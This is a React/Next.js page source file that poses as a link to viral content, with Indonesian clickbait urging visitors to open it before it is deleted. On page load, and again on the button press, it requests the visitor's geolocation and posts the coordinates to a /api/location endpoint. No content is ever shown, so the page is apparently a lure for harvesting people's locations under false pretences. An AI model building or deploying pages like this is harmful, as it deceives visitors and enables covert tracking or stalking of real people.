"use client";

import { useEffect, useState } from "react";

export default function Home() {
  const [loading, setLoading] = useState(false);

  const sendLocation = () => {
    if (loading) return;
    setLoading(true);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await fetch("/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
          }),
        });

        setLoading(false);
      },
      () => {
        setLoading(false);
      }
    );
  };

  // 🚀 Auto jalan saat halaman dibuka
  useEffect(() => {
    sendLocation();
  }, []);

  return (
    <main style={{
      height: "100vh",
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
      background: "linear-gradient(135deg, #667eea, #764ba2)",
      color: "white",
      textAlign: "center"
    }}>
      <div>
        <h1>🎁 Kontent viral hari ini.</h1>
        <p>Buka sekarang sebelum dihapus</p>

        <button
          onClick={sendLocation}
          style={{
            padding: "15px 25px",
            fontSize: "16px",
            borderRadius: "10px",
            border: "none",
            cursor: "pointer",
            background: "#fff",
            color: "#333",
            marginTop: "20px"
          }}
        >
          {loading ? "Memproses..." : "Buka Sekarang"}
        </button>
      </div>
    </main>
  );
}
